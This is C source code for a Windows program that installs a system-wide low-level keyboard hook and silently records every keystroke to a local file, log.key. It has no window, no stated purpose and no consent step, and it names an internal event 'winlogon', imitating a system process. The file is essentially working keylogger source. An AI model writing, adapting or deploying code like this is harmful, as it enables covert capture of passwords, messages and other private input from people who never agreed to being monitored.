#include <stdio.h>
#include <windows.h>

FILE *logFile;
char bufferForKeys[100];

BYTE keyState[256];
WCHAR buffer[16];
SYSTEMTIME sysTime;

HANDLE singleInstanceMutexHandle;
HHOOK keyboardHookHandle;
HANDLE quitEventHandle;

typedef struct METASTRUCT {
  int version;
  DWORD startTime;
} METASTRUCT;

DWORD prevTime = 0;
DWORD prevVkCode = 0;

LRESULT CALLBACK KeyboardHookDelegate(int nCode, WPARAM wParam, LPARAM lParam) {

  if (nCode == HC_ACTION) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

    /* BOOL isDown = wParam==WM_KEYDOWN || wParam==WM_SYSKEYDOWN; */
    /* BOOL isUp = wParam==WM_KEYUP || wParam==WM_SYSKEYUP; */
    /* GetKeyboardState((PBYTE)&keyState); */

    // don't record same key again
    if (p->time == prevTime && p->vkCode == prevVkCode) {
      return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    // fprintf(logFile, "%02x", isDown);
    fwrite(p, sizeof(KBDLLHOOKSTRUCT), 1, logFile);
    fflush(logFile);

    prevTime = p->time;
    prevVkCode = p->vkCode;
  }

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI ThreadedCode(LPVOID) {
  WaitForSingleObject(quitEventHandle, INFINITE);

  CloseHandle(singleInstanceMutexHandle);
  CloseHandle(quitEventHandle);
  UnhookWindowsHookEx(keyboardHookHandle);
  fclose(logFile);

  ExitProcess(0);

  return 0;
}

int WINAPI WinMain(HINSTANCE currentInstance, HINSTANCE previousInstance,
                   LPSTR commandLine, int showMode) {
  const char singleInstanceMutexName[] = "EventRecorder";
  const char quitEventName[] = "winlogon";

  singleInstanceMutexHandle = CreateMutex(NULL, TRUE, singleInstanceMutexName);
  int isAlreadyRunning = GetLastError() == ERROR_ALREADY_EXISTS;

  if (!isAlreadyRunning) {

    char logFilePath[MAX_PATH] = {0};
    sprintf(logFilePath, "log.key");

    METASTRUCT *meta = (METASTRUCT *)malloc(sizeof(METASTRUCT));

    meta->version = 1;
    meta->startTime = GetTickCount();

    // write file header
    logFile = fopen(logFilePath, "w");
    fwrite(meta, sizeof(METASTRUCT), 1, logFile);

    keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookDelegate,
                                          currentInstance, 0);
    {
      quitEventHandle = CreateEvent(NULL, FALSE, FALSE, quitEventName);

      int threadId;
      CreateThread(NULL, 0, ThreadedCode, 0, 0, &threadId);

      MSG message;
      while (GetMessage(&message, NULL, 0, 0)) {
      }
    }
  } else {
    quitEventHandle = OpenEvent(EVENT_ALL_ACCESS, FALSE, quitEventName);
    SetEvent(quitEventHandle);
  }

  return 0;
}
